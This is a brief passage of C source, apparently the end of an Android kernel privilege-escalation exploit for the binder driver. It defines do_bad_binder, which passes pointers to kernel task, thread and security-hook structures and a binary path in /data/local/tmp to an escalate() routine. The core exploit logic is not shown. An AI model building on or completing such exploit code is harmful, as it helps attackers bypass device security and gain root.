        if(0 <= iInitFd)
        {
            close(iInitFd);
            iInitFd = -1;
        }

    }

    return;
}

int32_t do_bad_binder(uint64_t* ppTaskStruct, uint64_t* ppThreadInfo, uint64_t* ppSecurityHookHeads, uint64_t* ppSecurityCapableListItem, char* pszRootExecPath)
{
    char somePath[ ] = "/data/local/tmp/test_elf";
    escalate(ppTaskStruct, ppThreadInfo, ppSecurityHookHeads, ppSecurityCapableListItem, somePath);
    return 0;
}